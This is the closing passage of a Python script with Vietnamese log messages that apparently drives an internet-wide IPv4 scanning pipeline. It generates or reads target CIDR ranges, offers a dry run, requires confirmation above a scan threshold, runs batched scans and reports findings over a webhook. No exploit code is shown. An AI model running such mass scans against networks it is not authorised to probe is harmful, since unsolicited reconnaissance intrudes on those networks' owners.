        seed = args.gen_seed if args.gen_seed is not None else AUTO_GEN_SEED
        shuffle = not args.no_shuffle and AUTO_GEN_SHUFFLE
        max_chunks = args.max_chunks if args.max_chunks is not None else AUTO_GEN_MAX_CHUNKS
        cidr = args.gen_cidr or AUTO_GEN_CIDR
        gen_key = {"cidr": cidr, "split_to": split_to, "shuffle": shuffle,
                   "seed": seed, "max_chunks": max_chunks,
                   "engine": target_generator.ENGINE}
        log.info("Auto-generate dải IPv4: %s → /%d (shuffle=%s seed=%d max_chunks=%d)",
                 cidr, split_to, shuffle, seed, max_chunks)
        ranges = target_generator.generate_ipv4_ranges(
            cidr=cidr, split_to=split_to, shuffle=shuffle, seed=seed,
            max_chunks=max_chunks, force=args.force_ranges)
        if not ranges:
            log.error("Không sinh được dải /%d nào từ %s — dừng (fail-closed).",
                      split_to, cidr)
            return 2
        log.info("Tổng %d dải /%d trong hàng đợi quét", len(ranges), split_to)
    elif manual:
        ranges = list(target_generator.SCAN_RANGES)
        gen_key = {"manual": ",".join(sorted(ranges)),
                  "engine": target_generator.ENGINE}
        log.info("Chế độ dải khai tay: %d dải — %s", len(ranges), ", ".join(ranges))
    else:
        log.error("Không có dải quét nào: dùng --scan-range <CIDR> hoặc bật "
                  "AUTO_GEN_RANGES (--gen-ranges). Dừng (fail-closed).")
        return 2

    # ── Guardrail P0 — 0.1: dry-run in kế hoạch; quét vượt ngưỡng phải confirm ──
    plan_hosts = estimate_plan_hosts(ranges)
    if args.dry_run:
        print_plan(args, ranges, plan_hosts, use_auto, gen_key)
        return 0
    if not guard_internet_wide(args, plan_hosts):
        return 2

    # Chạy vòng lặp batch (có checkpoint/resume + webhook tiến độ)
    all_findings, _all_fps, agg_stats, confirmed_all = run_range_batches(
        ranges, gen_key, args)

    if args.notify_progress:
        webhook.notify_summary(agg_stats)

    print_summary(agg_stats, confirmed_all)
    log.info("Pipeline hoàn tất trong %.1fs — %d dải /16, %d finding tổng cộng",
             time.time() - t0, len(ranges), len(all_findings))
    return 0


if __name__ == "__main__":
    sys.exit(main())










